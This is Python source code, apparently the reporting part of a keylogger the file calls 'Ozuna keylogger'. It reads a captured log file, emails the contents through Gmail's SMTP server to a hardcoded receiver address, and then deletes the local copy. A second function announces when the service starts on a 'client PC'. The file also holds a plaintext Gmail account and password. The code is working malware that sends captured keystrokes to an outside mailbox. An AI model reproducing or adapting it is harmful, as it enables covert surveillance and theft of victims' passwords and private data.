import smtplib
import os
from time import strftime
import datetime

gmail_user = 'ozunakeylogger@gmail.com'
receiver = 'juandanielozuna2@gmail.com'
gmail_password = 'ozuna123'


def send_log():
    if os.path.exists('output.txt'):
        print('FOUND OUTPUT FILE')
        f = open("output.txt", "r")
        contents = f.read()
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(gmail_user, gmail_password)
        subject = "Custom Keylogger Email; {0}".format(datetime.datetime.now().strftime("%b %d %Y %H:%M:%S"))
        message = """Subject: {0}
        \n\n
        {1}
        """.format(subject, contents)
        message = message.encode("ascii", errors="ignore")
        s.sendmail(gmail_user, receiver, message)
        print('EMAIL SENT TO ' + receiver)
        if os.path.exists('output.txt'):
            os.remove('output.txt')
        print(contents)


def send_application_start_message():
    startingDate = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(gmail_user, gmail_password)
    message = """Subject: OZUNA KEYLOGGER STARTED
    \n\n
    The purpose of this email is to indicate the the service started in a client PC
    Date of the act: {0}
    """.format(startingDate)
    s.sendmail(gmail_user, receiver, message)